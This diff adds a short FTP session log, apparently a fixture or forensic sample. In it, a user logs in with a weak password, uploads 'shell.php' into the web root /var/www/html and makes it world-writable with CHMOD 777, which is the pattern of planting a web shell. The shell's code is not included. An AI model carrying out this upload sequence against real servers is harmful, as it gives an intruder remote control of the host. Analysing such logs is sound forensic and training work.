@@ -1,0 +1,25 @@
+220 Hello FTP World!
+USER jenny
+331 Please specify the password.
+PASS password123
+230 Login successful.
+SYST
+215 UNIX Type: L8
+PWD
+257 "/var/www/html" is the current directory
+PORT 192,168,0,147,225,49
+200 PORT command successful. Consider using PASV.
+LIST -la
+150 Here comes the directory listing.
+226 Directory send OK.
+TYPE I
+200 Switching to Binary mode.
+PORT 192,168,0,147,196,163
+200 PORT command successful. Consider using PASV.
+STOR shell.php
+150 Ok to send data.
+226 Transfer complete.
+SITE CHMOD 777 shell.php
+200 SITE CHMOD command ok.
+QUIT
+221 Goodbye.
